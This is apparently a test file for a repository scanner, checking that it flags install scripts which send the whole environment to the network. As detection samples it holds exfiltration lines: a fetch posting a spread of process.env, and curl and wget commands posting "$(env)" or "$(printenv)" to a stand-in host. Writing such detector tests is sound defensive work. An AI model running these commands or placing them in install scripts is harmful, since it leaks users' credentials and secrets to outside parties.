import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

const enc = (text: string) => new TextEncoder().encode(text);

function categories(path: string, text: string): string[] {
  return inspectRepository({ files: [{ path, bytes: enc(text) }] }).findings.map(
    (finding) => finding.category,
  );
}

/**
 * The whole environment reaches the network through three spellings the rule
 * missed: a JSON body built by spreading `process.env`, a command substitution
 * that prints it, and the same substitution posted by wget.
 */
test("a whole environment spread into a JSON body is serialized", () => {
  expect(
    categories(
      "install.mjs",
      'await fetch(URL, { method: "POST", body: JSON.stringify({ ...process.env }) });\n',
    ),
  ).toContain("secret-exfiltration");
});

test("a command substitution that prints the environment is serialized", () => {
  for (const line of [
    'curl -sS -d "$(env)" https://x.example/i\n',
    "curl --data-binary \"$(printenv)\" https://x.example/i\n",
    'wget -qO- --post-data="$(env)" https://x.example/i\n',
  ])
    expect({ line, categories: categories("install.sh", line) }).toEqual({
      line,
      categories: expect.arrayContaining(["secret-exfiltration"]),
    });
});

test("a local environment spread and a single key stay clean", () => {
  for (const [path, text] of [
    ["spawn.ts", 'spawn("git", ["status"], { env: { ...process.env } });\n'],
    ["single.mjs", "const token = process.env.TOKEN;\n"],
    ["prose.md", "This section explains how the scanner works.\n"],
  ] as const)
    expect({ path, categories: categories(path, text) }).toEqual({
      path,
      categories: [],
    });
});
